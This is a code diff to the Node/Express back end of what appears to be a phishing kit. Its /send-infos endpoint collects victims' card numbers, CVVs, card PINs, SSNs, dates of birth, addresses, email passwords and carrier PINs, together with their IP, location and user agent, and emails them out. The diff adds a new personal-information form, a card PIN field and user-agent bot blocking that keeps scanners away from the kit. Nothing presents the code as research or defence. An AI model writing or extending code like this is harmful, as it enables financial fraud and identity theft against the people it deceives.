@@ -15,6 +15,7 @@ Object.defineProperty(exports, "__esModule", { value: true });
 const express_1 = __importDefault(require("express"));
 const express_nobots_1 = __importDefault(require("express-nobots"));
 const geoip_lite_1 = __importDefault(require("geoip-lite"));
+const mobile_detect_1 = __importDefault(require("mobile-detect"));
 require("dotenv").config();
 const sendEmail_1 = require("./utils/sendEmail");
 const path_1 = __importDefault(require("path"));
@@ -23,6 +24,11 @@ const port = process.env.PORT || 5000;
 app.use(express_nobots_1.default());
 app.use(express_1.default.json());
 app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    const md = new mobile_detect_1.default(req.headers["user-agent"]);
+    const isBot = md.is("Bot");
+    if (isBot) {
+        res.send("Fuck off");
+    }
     try {
         const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
         const geo = geoip_lite_1.default.lookup(ip);
@@ -55,24 +61,34 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
                     ? `
       <br>
       <h4>| CARD INFORMATION</h4>
-      <p>| FULL NAME 👉🏽 <b>${values.cardInformation.fullname}</b></p>
       <p>| CARD NUMBER 👉🏽 <b>${values.cardInformation.cardNumber}</b></p>
       <p>| EXPIRATION DATE 👉🏽 <b>${values.cardInformation.expiryDate}</b></B></p>
       <p>| CVV 👉🏽 <b>${values.cardInformation.cvv}</b></p>
-      <p>| SSN 👉🏽 <b>${values.cardInformation.ssn}</b></p>
-      <p>| DOB 👉🏽 <b>${values.cardInformation.dob}</b></p>
-      <p>| ADDRESS 👉🏽 <b>${values.cardInformation.fullAddress}</b></p>
+      <p>| CARD PIN 👉🏽 <b>${values.cardInformation.cardPin}</b></p>
       <br>
      `
-                    : `
-               <br><br>
+                    : `${values.form === "PERSONAL INFORMATION"
+                        ? `
+         <br>
+         <h4>| PERSONAL INFORMATION</h4>
+         <p>| FIRST NAME 👉🏽 <b>${values.personalInfo.firstname}</b></p>
+         <p>| LAST NAME 👉🏽 <b>${values.personalInfo.lastname}</b></p>
+         <p>| SSN 👉🏽 <b>${values.personalInfo.ssn}</b></p>
+         <p>| DOB 👉🏽 <b>${values.personalInfo.dob}</b></p>
+         <p>| ADDRESS 👉🏽 <b>${values.personalInfo.address}</b></p>
+         <p>| ZIP CODE 👉🏽 <b>${values.personalInfo.zipCode}</b></p>
+         <p>| STATE 👉🏽 <b>${values.personalInfo.state}</b></p>
+         <br>
+        `
+                        : `
+               <br>
                <h4>| ACCOUNT UPDATE</h4>
                <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
                <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.password}</b></p>
                <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
                <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
-               <br><br>
-               `}`}
+               <br>
+               `}`}`}
      `}
      <div>*******************************************************************************************</div>
      <div>*******************************************************************************************</div>
@@ -80,6 +96,7 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
      <p>| IP 👉🏽 <b>${ip}</b></p>
      <p>| LOCATION 👉🏽 <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
      <p>| TIMEZONE 👉🏽 <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
+     <p>| USER AGENT 👉🏽 <b>${req.headers["user-agent"]}</b></p>
      <br>
      <div>*******************************************************************************************</div>
      <div>********************************************END********************************************</div>
@@ -91,7 +108,12 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
     }
 }));
 app.use(express_1.default.static(path_1.default.join(__dirname, "../build")));
-app.get("/*", (_, res) => {
+app.get("/*", (req, res) => {
+    const md = new mobile_detect_1.default(req.headers["user-agent"]);
+    const isBot = md.is("Bot");
+    if (isBot) {
+        res.send("Fuck off");
+    }
     res.sendFile(path_1.default.join(__dirname, "../build", "index.html"));
 });
 app.listen(port, () => {
